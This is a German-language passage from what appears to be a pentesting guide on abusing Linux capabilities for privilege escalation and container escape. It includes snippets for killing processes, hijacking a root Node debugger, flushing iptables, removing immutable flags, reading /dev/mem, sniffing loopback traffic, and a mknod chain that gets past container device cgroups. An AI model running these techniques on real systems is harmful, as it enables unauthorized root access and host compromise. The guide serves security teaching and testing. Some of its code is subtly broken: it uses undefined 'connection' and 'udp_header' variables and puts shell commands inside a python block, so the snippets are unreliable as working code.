cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
    print (cap + " was successfully added to " + path)
```

```bash
python setcapability.py /usr/bin/python2.7
```

> [!WARNING]
> Ein neu geschriebener Dateicapability-Satz ersetzt den vorherigen Satz. Wird das Hilfsprogramm anschließend nur mit den neuen Capabilities ausgeführt, verfügt es möglicherweise nicht mehr über `CAP_SETFCAP`, um eine andere Datei zu aktualisieren.<sup>[[14]](#references)[[25]](#references)</sup>

Sobald du über [SETUID capability](linux-capabilities.md#cap_setuid) verfügst, kannst du den entsprechenden Abschnitt aufrufen, um zu erfahren, wie du deine Privilegien eskalierst.

**Beispiel mit Umgebung (Docker breakout)**

Dockers dokumentierter Standard-Capability-Satz umfasst **CAP_SETFCAP**, der tatsächliche Satz hängt jedoch von der Laufzeitkonfiguration ab.<sup>[[19]](#references)</sup>
Du kannst die Prozess-Capabilities mit folgendem Befehl überprüfen:

```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```

Diese Capability ermöglicht das Schreiben von File-Capabilities, gewährt dem aktuellen Prozess diese Capabilities jedoch nicht von sich aus und umgeht auch nicht die Datei-, Bounding-Set- und Namespace-Regeln, die beim Ausführen der Datei gelten.<sup>[[14]](#references)</sup>

```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```

Die für die Datei zulässigen Capabilities werden durch die Capability-Bounding-Set des Prozesses begrenzt. Das Effective-Bit der Datei steuert, ob die zulässige Menge der Datei in die Effective-Menge des Prozesses übernommen wird. Deshalb macht das Hinzufügen von Capabilities zu einer Datei nicht automatisch jede angeforderte Capability zur Ausführungszeit nutzbar.<sup>[[14]](#references)</sup>

## CAP_SYS_RAWIO

[**CAP_SYS_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht eine Reihe sensibler Operationen, darunter den Zugriff auf `/dev/mem`, `/dev/kmem` oder `/proc/kcore`, die Änderung von `mmap_min_addr`, den Zugriff auf die Systemaufrufe `ioperm(2)` und `iopl(2)` sowie verschiedene Festplattenbefehle. Auch `FIBMAP ioctl(2)` wird durch diese Capability ermöglicht, was in der [Vergangenheit](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html) zu Problemen geführt hat. Laut Manpage kann der Inhaber damit außerdem eine Reihe gerätespezifischer Operationen auf anderen Geräten ausführen.<sup>[[14]](#references)</sup>

Dies kann für **privilege escalation** und **Docker breakout** nützlich sein.<sup>[[14]](#references)</sup>

Die Capability allein stellt keine nützliche Schnittstelle bereit. Für einen Container-Breakout sind zusätzlich ein zugängliches Host-Gerät oder eine zugängliche Host-Ressource, passende Geräte-Cgroup- und Dateisystemberechtigungen sowie eine hardware- und kernelspezifische Technik erforderlich. Strenge Regeln für `/dev/mem`, Kernel Lockdown, Virtualisierung, seccomp und LSM-Richtlinien schließen die allgemeinen Angriffspfade häufig aus. Prüfe zuerst die Capability und die vorhandenen Zugriffsmöglichkeiten:

```bash
capsh --print | grep cap_sys_rawio
ls -l /dev/mem /dev/port 2>/dev/null
find /sys/bus/pci/devices -maxdepth 2 -name 'resource*' -ls 2>/dev/null
```

Wenn `/dev/mem` die genehmigte Schnittstelle ist, kann ein Wegwerflabor die bereichsübergreifende Offenlegung von Knotenspeicher demonstrieren, indem es einen Bereich aus der Hardwarezuordnung dieses Labors liest und hasht:

```bash
approved_physical_address=<lab-provided-decimal-address>
approved_byte_count=<lab-provided-size>
dd if=/dev/mem of=/tmp/ht-rawio-proof.bin bs=1 \
  skip="${approved_physical_address}" count="${approved_byte_count}" status=none
wc -c /tmp/ht-rawio-proof.bin
sha256sum /tmp/ht-rawio-proof.bin
rm /tmp/ht-rawio-proof.bin
```

Gehe nicht von einem bestimmten Adressbereich aus: Das Lesen bestimmter MMIO-Bereiche kann Nebenwirkungen haben, und eine gültige Adresse auf einer Plattform kann auf einer anderen Hardware oder Kernel-Speicher steuern. Änderungen am Kernel-Speicher oder die Gerätesteuerung erfordern einen genehmigten, plattformspezifischen Nachweis; ein sicheres, universelles Beispiel für rohe Schreibzugriffe gibt es nicht.

## CAP_KILL

**Diese Capability umgeht Berechtigungsprüfungen beim Senden von Signalen an Prozesse in den vom Kernel definierten Fällen**.<sup>[[14]](#references)</sup>

**Beispiel mit einer Binary**

Angenommen, die **`python`**-Binary verfügt über diese Capability. Wenn du **zusätzlich eine Service- oder Socket-Konfiguration** (oder eine beliebige Konfigurationsdatei, die zu einem Service gehört) ändern könntest, könntest du sie mit einer Backdoor versehen, dann den Prozess dieses Services beenden und warten, bis die neue Konfigurationsdatei mit deiner Backdoor ausgeführt wird.

```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```

**Privesc mit kill**

Wenn du über kill-Capabilities verfügst und ein **Node-Programm als root** (oder als anderer Benutzer) läuft, kannst du ihm wahrscheinlich das **Signal SIGUSR1 senden** und so den **Node-Debugger öffnen**, mit dem du dich verbinden kannst.

```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```


{{#ref}}
../software-information/electron-cef-chromium-debugger-abuse.md
{{#endref}}


## CAP_NET_BIND_SERVICE

**Diese Capability ermöglicht das Binden an Internet-Ports unter 1024.** Sie ermöglicht keine direkte weitergehende Privilegieneskalation.<sup>[[14]](#references)</sup>

**Beispiel mit Binärdatei**

Wenn **`python`** über diese Capability verfügt, kann es an jedem Port lauschen und sich sogar von dort aus mit jedem anderen Port verbinden (einige Dienste erfordern Verbindungen von bestimmten privilegierten Ports).

{{#tabs}}
{{#tab name="Listen"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
        output = connection.recv(1024).strip();
        print(output)
```

{{#endtab}}

{{#tab name="Connect"}}

```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```

{{#endtab}}
{{#endtabs}}

## CAP_NET_RAW

[**CAP_NET_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html) erlaubt Prozessen, **RAW- und PACKET-Sockets zu erstellen**, sodass sie beliebige Netzwerkpakete erzeugen und senden können. Dies kann in containerisierten Umgebungen zu Sicherheitsrisiken führen, etwa durch Packet-Spoofing, Traffic-Injection und das Umgehen von Netzwerkzugriffskontrollen. Angreifer könnten dies ausnutzen, um das Container-Routing zu stören oder die Netzwerksicherheit des Hosts zu gefährden, insbesondere wenn keine ausreichenden Firewall-Schutzmaßnahmen vorhanden sind. Außerdem unterstützt **CAP_NET_RAW** Vorgänge wie Ping über RAW-ICMP-Anfragen.<sup>[[14]](#references)</sup>

**Damit kann mit einer geeigneten Socket-Schnittstelle der Netzwerkverkehr mitgeschnitten werden.** Das gewährt keine direkte weitergehende Privilegienerweiterung.<sup>[[14]](#references)</sup>

Bei einem Pfad zur Offenlegung von Zugangsdaten sollte außerdem bestätigt werden, dass das aktuelle Konto ein Mitschnitt-Tool mit effektiven Capabilities ausführen kann, dass der betreffende Traffic eine in seinem Network Namespace sichtbare Schnittstelle durchläuft und dass Authentifizierungsdaten im Klartext übertragen werden. Beispielsweise können HTTP-Basic-Zugangsdaten über unverschlüsseltes HTTP auf Loopback beobachtet werden, wenn das Mitschnitt-Tool auf diese Schnittstelle zugreifen kann. Ein Kontowechsel setzt zusätzlich voraus, dass die abgefangenen Zugangsdaten für eine andere Identität funktionieren; eine File Capability oder eine sichtbare Login-Anfrage allein belegt keine Wiederverwendung von Passwörtern.

Auf einem Wireless-Host ist ein ausführbares WPS-Audit-Tool wie `reaver` mit effektiver `CAP_NET_RAW` sowie ein AP und eine über `iw dev` sichtbare Schnittstelle im Monitor-Modus ein weiterer Prüfhinweis. Dies ist **kein** Beweis für eine nutzbare Privilegienerweiterung: Der AP muss WPS-PIN-Authentifizierung ohne wirksame Sperre ermöglichen, über die Wireless-Schnittstelle erreichbar sein und einen PSK preisgeben; die Host-Privilegien ändern sich nur, wenn dieser PSK für ein Konto wiederverwendet wird. Bei passiver Aufzählung sollten Schnittstellenmodi und Capabilities erfasst werden, ohne Probe-Pakete zu senden oder PINs auszuprobieren. Siehe [CERT/CC VU#723755](https://www.kb.cert.org/vuls/id/723755) zur Schwachstelle bei WPS-PINs und die [Projektdokumentation von Reaver](https://github.com/shift/reaver-wps) zum Verhalten des Tools.

**Beispiel mit Binary**

Wenn das Binary **`tcpdump`** über diese Capability verfügt, kannst du damit Netzwerkinformationen mitschneiden.

```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```

Wenn die **Umgebung** diese Capability gewährt, kann **`tcpdump`** sie ebenfalls verwenden, um Netzwerkverkehr mitzuschneiden.<sup>[[14]](#references)</sup>

**Beispiel mit Binary 2**

Das folgende Beispiel ist **`python2`**-Code, der nützlich sein kann, um den Verkehr der Schnittstelle „**lo**“ (**localhost**) abzufangen. Der Code stammt aus dem Lab „_Die Grundlagen: CAP-NET_BIND + NET_RAW_“ von [https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com).<sup>[[1]](#references)</sup>

```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
    flag=""
    for i in xrange(8,-1,-1):
        if( flag_value & 1 <<i ):
            flag= flag + flags[8-i] + ","
    return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
    frame=s.recv(4096)
    ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
    proto=ip_header[6]
    ip_header_size = (ip_header[0] & 0b1111) * 4
    if(proto==6):
        protocol="TCP"
        tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
        tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
        dst_port=tcp_header[0]
        src_port=tcp_header[1]
        flag=" FLAGS: "+getFlag(tcp_header[4])

    elif(proto==17):
        protocol="UDP"
        udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
        udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
        dst_port=udp_header[0]
        src_port=udp_header[1]

    if (proto == 17 or proto == 6):
        print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
        count=count+1
```

## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html) verleiht dem Inhaber die Berechtigung, **Netzwerkkonfigurationen zu ändern**, darunter Firewall-Einstellungen, Routingtabellen, Socket-Berechtigungen und Netzwerkschnittstelleneinstellungen im aktuellen network namespace. Außerdem kann damit der Promiscuous Mode für eine Schnittstelle in diesem namespace aktiviert werden. Dadurch kann an diese Schnittstelle geleiteter Traffic offengelegt werden, doch allein dadurch ist kein Sniffing beliebiger Schnittstellen in anderen network namespaces möglich.<sup>[[14]](#references)</sup>

Diese Vorgänge betreffen den **aktuellen network namespace** des Prozesses. Die Kontrolle über den Netzwerkzustand des Hosts erfordert `--network=host`, Kubernetes `hostNetwork: true` oder eine separate Primitive zum Wechseln des namespace. `CAP_NET_RAW` allein ist keine generische Host-Shell, war jedoch an einem dokumentierten, protokollspezifischen Escape beteiligt: Eine historische GCE-Kette kombinierte root, den Host-network namespace, `CAP_NET_ADMIN`, `CAP_NET_RAW`, unverschlüsselten Metadata-Traffic und eine racebare Anfrage an den Guest Agent, um einen SSH-Schlüssel einzuschleusen. Die vollständigen Voraussetzungen und Hinweise zu modernen HTTPS-Metadaten findest du unter [GCP - Network Docker Escape](https://cloud.hacktricks.wiki/en/pentesting-cloud/gcp-security/gcp-privilege-escalation/gcp-network-docker-escape.html).

**Beispiel mit einer Binärdatei**

Nehmen wir an, die **Python-Binärdatei** hat diese Capabilities.

```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```

## CAP_LINUX_IMMUTABLE

**Diese Capability erlaubt das Ändern von Inode-Flags wie „immutable“ und „append-only“. Sie gewährt nicht direkt umfassendere Möglichkeiten zur Privilegienausweitung.**<sup>[[14]](#references)</sup>

**Beispiel mit einer Binärdatei**

Wenn du feststellst, dass eine Datei immutable ist und python über diese Capability verfügt, kannst du **das immutable-Attribut entfernen und die Datei bearbeitbar machen:**

```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
# Python code to remove the immutable flag and allow modifications
import fcntl
import os
import struct

FS_IMMUTABLE_FL = 0x00000010
FS_IOC_GETFLAGS = 0x80086601
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
flags = struct.unpack('i', fcntl.ioctl(fd, FS_IOC_GETFLAGS, struct.pack('i', 0)))[0]
fcntl.ioctl(fd, FS_IOC_SETFLAGS, struct.pack('i', flags & ~FS_IMMUTABLE_FL))
os.close(fd)

with open('/path/to/file.sh', 'a') as f:
    f.write('New content for the file\n')
```

Die Operationen `FS_IOC_GETFLAGS` und `FS_IOC_SETFLAGS` lesen und aktualisieren Inode-Flags; `FS_IMMUTABLE_FL` ist das unveränderliche Flag, das in diesem Beispiel gelöscht wird.<sup>[[27]](#references)</sup>

> [!TIP]
> Beachte, dass dieses unveränderliche Attribut normalerweise mit Folgendem gesetzt und entfernt wird:
>
> ```bash
> sudo chattr +i file.txt
> sudo chattr -i file.txt
> ```

## CAP_SYS_CHROOT

[**CAP_SYS_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht die Ausführung des Systemaufrufs `chroot(2)`, der mithilfe bekannter Techniken das Entkommen aus einem schwach konfigurierten `chroot(2)`-Jail ermöglichen kann.<sup>[[11]](#references)[[14]](#references)</sup>

Dies ist eine **Capability zum Entkommen aus einem chroot-Jail, kein eigenständiger Container-zu-Host-Escape**. Sie legt weder das Host-Dateisystem offen noch umgeht sie dessen Berechtigungen. Ist ein Host-Root-Dateisystem bereits eingehängt oder über `/proc/<pid>/root` erreichbar, legt `chroot()` diesen bestehenden Verzeichnisbaum lediglich als Pfadwurzel des Prozesses fest. Unabhängig davon erfordert das Wechseln von Mount-Namespaces mit `setns(2)` sowohl `CAP_SYS_CHROOT` als auch `CAP_SYS_ADMIN` im User-Namespace des aufrufenden Prozesses sowie `CAP_SYS_ADMIN` im User-Namespace, dem der Ziel-Mount-Namespace gehört.<sup>[[14]](#references)</sup>

- [Wie man aus verschiedenen chroot-Lösungen ausbricht](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf).<sup>[[11]](#references)</sup>
- [chw00t: chroot-Escape-Tool](https://github.com/earthquake/chw00t/)

## CAP_SYS_BOOT

[**CAP_SYS_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html) ermöglicht die Ausführung des Systemaufrufs `reboot(2)` zum Neustart des Systems, einschließlich Befehlen wie `LINUX_REBOOT_CMD_RESTART2`; außerdem ermöglicht sie `kexec_load(2)` und ab Linux 3.17 `kexec_file_load(2)`, um neue beziehungsweise signierte Crash-Kernel zu laden.<sup>[[14]](#references)</sup>

In einem privaten PID-Namespace beendet eine unterstützte `reboot()`-Anforderung den Init-Prozess dieses Namespace, statt den Host neu zu starten. Ein Neustart des Hosts setzt daher voraus, dass der Prozess zum initialen PID-Namespace gehört, normalerweise über die gemeinsame Nutzung der Host-PIDs. Eine Übernahme per kexec erfordert zusätzlich ein kompatibles Image, einen verfügbaren Systemaufruf sowie permissive Lockdown- und Signaturrichtlinien. Führe keinen der beiden Vorgänge auf einem gemeinsam genutzten Host aus, nur um die Capability zu überprüfen:

```bash
capsh --print | grep cap_sys_boot
readlink /proc/self/ns/pid /proc/1/ns/pid
command -v kexec 2>/dev/null
cat /sys/kernel/security/lockdown 2>/dev/null
```

## CAP_SYSLOG

[**CAP_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html) wurde in Linux 2.6.37 von der umfassenderen **CAP_SYS_ADMIN** getrennt und gewährt speziell die Möglichkeit, den `syslog(2)`-Aufruf zu verwenden. Diese Capability ermöglicht das Anzeigen von Kernel-Adressen über `/proc` und ähnliche Schnittstellen, wenn die Einstellung `kptr_restrict` auf 1 gesetzt ist. Sie steuert die Sichtbarkeit von Kernel-Adressen. Seit Linux 2.6.39 ist der Standardwert für `kptr_restrict` 0, wodurch Kernel-Adressen sichtbar sind. Aus Sicherheitsgründen setzen viele Distributionen den Wert jedoch auf 1 (Adressen sind nur für uid 0 sichtbar) oder 2 (Adressen sind immer verborgen).<sup>[[14]](#references)</sup>

Zusätzlich ermöglicht **CAP_SYSLOG** den Zugriff auf die `dmesg`-Ausgabe, wenn `dmesg_restrict` auf 1 gesetzt ist. Trotz dieser Änderungen behält **CAP_SYS_ADMIN** aufgrund historischer Präzedenzfälle die Fähigkeit, `syslog`-Operationen auszuführen.<sup>[[14]](#references)</sup>

## CAP_MKNOD

[**CAP_MKNOD**](https://man7.org/linux/man-pages/man7/capabilities.7.html) erweitert die Funktionalität des Systemaufrufs `mknod` über das Erstellen regulärer Dateien, FIFOs (benannter Pipes) oder UNIX-Domain-Sockets hinaus. Sie ermöglicht ausdrücklich das Erstellen spezieller Dateien, darunter:<sup>[[14]](#references)</sup>

- **S_IFCHR**: Spezielle Zeichendateien, also Geräte wie Terminals.
- **S_IFBLK**: Spezielle Blockdateien, also Geräte wie Datenträger.

Diese Capability ist für Prozesse nützlich, die Gerätedateien erstellen müssen, darunter Zeichen- oder Blockgeräte.<sup>[[14]](#references)</sup>

Sie ist in der dokumentierten Standard-Capability-Menge von Docker enthalten. Prüfe die tatsächliche Laufzeitkonfiguration, anstatt davon auszugehen, dass jede Bereitstellung dieselben Standardwerte verwendet ([Moby default capability list](https://github.com/moby/moby/blob/master/oci/caps/defaults.go#L6-L19)).<sup>[[19]](#references)</sup>

Für einen Container Escape kann `CAP_MKNOD` einen fehlenden Verweis auf ein echtes Host-Gerät erstellen, aber sie erstellt **nicht** das zugrunde liegende Gerät und umgeht **nicht** die Device-Cgroup. Die vollständige Kette erfordert:

1. Effektive `CAP_MKNOD` im initialen User-Namespace, da das Erstellen von Geräten nicht namespaced ist.
2. Den richtigen Block- oder Zeichentyp sowie die Major-/Minor-Nummern eines echten Host-Geräts.
3. Die Berechtigung der Device-Cgroup, das Gerät zu öffnen.
4. Einen kompatiblen dateisystemfähigen Reader oder `CAP_SYS_ADMIN`, um ein Block-Dateisystem einzuhängen.
5. Dateisystem- und LSM-Berechtigungen zum Erstellen und Verwenden des Geräteknotens.

Für ein Ext-Dateisystem-Blockgerät in einer Laborumgebung mit den tatsächlichen Major-/Minor-Nummern `252:1` lautet eine schreibgeschützte Prüfung:

```bash
mknod /dev/ht-node-root b 252 1
ls -l /dev/ht-node-root
debugfs -R 'cat /etc/hostname' /dev/ht-node-root
rm /dev/ht-node-root
```

Ersetze die Zahlen durch die Werte aus `/sys/class/block/<device>/dev`. Wenn das Erstellen des Geräteknotens gelingt, das Öffnen aber `Operation not permitted` zurückgibt, blockiert weiterhin die Device-Cgroup den Zugriff. Das ist das normale Ergebnis in einem Container, der lediglich über Dockers standardmäßiges `CAP_MKNOD` verfügt, ohne dass das Gerät ausdrücklich freigegeben wurde.

Es gibt außerdem eine eigenständige **Local-Privilege-Escalation-Technik mit zwei Footholds**, die nicht mit dem direkten Zugriff auf Container-Geräte verwechselt werden darf. Ein Root-Prozess in einem Container, der den anfänglichen User-Namespace gemeinsam nutzt, kann einen Blockgeräteknoten erstellen, während eine unprivilegierte Shell auf dem Host mit einer passenden UID diesen Knoten über `/proc/<container-pid>/root` öffnet. Das Öffnen wird dann anhand der Cgroup der Host-Shell geprüft, sodass die Device-Cgroup-Sperre des Containers das Gerät nicht mehr schützt.<sup>[[7]](#references)</sup>

Erstelle im Container den Knoten und lass einen Prozess mit der UID des bestehenden Host-Footholds laufen:

```bash
host_uid=1000 # Replace with the UID of the existing unprivileged host shell.
mknod /dev/ht-node-root b 252 1 # Replace with the real host device numbers.
chown "$host_uid" /dev/ht-node-root
chmod 600 /dev/ht-node-root
bridge_user=$(getent passwd "$host_uid" | cut -d: -f1)
if [ -z "$bridge_user" ]; then
  useradd -u "$host_uid" -M htbridge
  bridge_user=htbridge
fi
su -s /bin/sh "$bridge_user" -c 'sleep 600'
```

Identifizieren Sie in der vorhandenen Host-Shell mit dieser UID die Host-PID des schlafenden Containerprozesses und verwenden Sie dessen procfs-Root als Pfad zum Gerät:

```bash
container_pid=<host-pid-of-the-matching-uid-process>
stat "/proc/${container_pid}/root/dev/ht-node-root"
debugfs -R 'cat /etc/hostname' "/proc/${container_pid}/root/dev/ht-node-root"
```

Diese Chain erfordert beide Footholds, einen identity-mapped oder gemeinsam genutzten User-Namespace, die Berechtigung, das Ziel `/proc/<pid>/root` zu durchlaufen, ein echtes Device mit den korrekten Major-/Minor-Nummern und eine äußere cgroup, die das Öffnen erlaubt. `hidepid`, ptrace-Zugriffsregeln, ein LSM, Inkompatibilität des Dateisystems oder User-Namespace-Remapping können sie unterbrechen. Die historische Technik ist gerade deshalb wertvoll, weil sie erklärt, wie `/proc/<pid>/root` die Device-cgroup-Beschränkung des *Containers* umgehen kann; sie behauptet nicht, dass `CAP_MKNOD` allein aus einem normalerweise isolierten Container ausbricht.<sup>[[7]](#references)</sup>

### CAP_SETPCAP

Auf aktuellen Linux-Kernels mit File-Capabilities kann ein Thread mit **`CAP_SETPCAP`** Capabilities aus seiner Bounding-Set zu seiner Inheritable-Set hinzufügen, Capabilities aus seiner Bounding-Set entfernen und seine Securebits ändern. Damit kann ein Prozess nicht beliebig anderen Prozessen Capabilities gewähren; dieses Verhalten gilt nur für Kernel vor 2.6.25 ohne Unterstützung für File-Capabilities.<sup>[[14]](#references)</sup>

Der Systemaufruf `capset()` kann die eigenen Effective-, Permitted- und Inheritable-Sets eines Threads anpassen. Die neue Permitted-Set darf jedoch keine Capabilities enthalten, die nicht bereits in der vorhandenen Permitted-Set sind, und Aktualisierungen der Inheritable-Set unterliegen weiterhin den Einschränkungen des Kernels.<sup>[[14]](#references)</sup>

## References

- [1] [AttackDefense (Pentester Academy) - Linux-Capabilities-Labs zur Rechteausweitung](https://attackdefense.pentesteracademy.com)
- [2] [Hacker's Grimoire - Rechteausweitung unter Linux](https://vulp3cula.gitbook.io/hackers-grimoire/post-exploitation/privesc-linux)
- [3] [Linux-Container-Grundlagen: Capabilities](https://www.schutzwerk.com/en/43/posts/linux_container_capabilities/)
- [4] [Linux-Capabilities 101](https://linux-audit.com/linux-capabilities-101/)
- [5] [Linux-Capabilities ausnutzen](https://www.linuxjournal.com/article/5737)
- [6] [Übermäßige Capabilities](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/excessive-capabilities#cap_sys_module)
- [7] [Zugriff auf Mount-Namespaces über /proc/pid/root ausnutzen](https://labs.reversec.com/posts/2020/06/abusing-access-to-mount-namespaces-through-procpidroot)
- [8] [Linux-Capabilities: Warum es sie gibt und wie sie funktionieren](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
- [9] [Capabilities unter Linux verstehen](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)
- [10] [PoC zum Umgehen von seccomp, wenn ptrace erlaubt ist](https://gist.github.com/thejh/8346f47e359adecd1d53)
- [11] [So entkommt man verschiedenen chroot-Lösungen](https://deepsec.net/docs/Slides/2015/Chw00t_How_To_Break%20Out_from_Various_Chroot_Solutions_-_Bucsay_Balazs.pdf)
- [12] [shocker.c - Originaler Docker-Breakout-Exploit mit CAP_DAC_READ_SEARCH von Sebastian Krahmer](http://stealth.openwall.net/xSports/shocker.c)
- [13] [Analyse eines Docker-Breakout-Exploits](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)
- [14] [capabilities(7) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [15] [proc_pid_status(5) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/proc_pid_status.5.html)
- [16] [pam_cap(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/pam_cap.8.html)
- [17] [capability.conf(5) - Ubuntu-Handbuchseite](https://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html)
- [18] [systemd.exec(5) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man5/systemd.exec.5.html)
- [19] [Container ausführen - Docker-Dokumentation](https://docs.docker.com/engine/containers/run/)
- [20] [docker container run - Docker-Dokumentation](https://docs.docker.com/reference/cli/docker/container/run)
- [21] [cap_text_formats(7) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man7/cap_text_formats.7.html)
- [22] [getpcaps(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/getpcaps.8.html)
- [23] [getcap(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/getcap.8.html)
- [24] [amicontained](https://github.com/genuinetools/amicontained)
- [25] [setcap(8) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man8/setcap.8.html)
- [26] [capsh(1) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man1/capsh.1.html)
- [27] [ioctl_iflags(2) - Linux-Handbuchseite](https://man7.org/linux/man-pages/man2/ioctl_iflags.2.html)
{{#include ../../banners/hacktricks-training.md}}
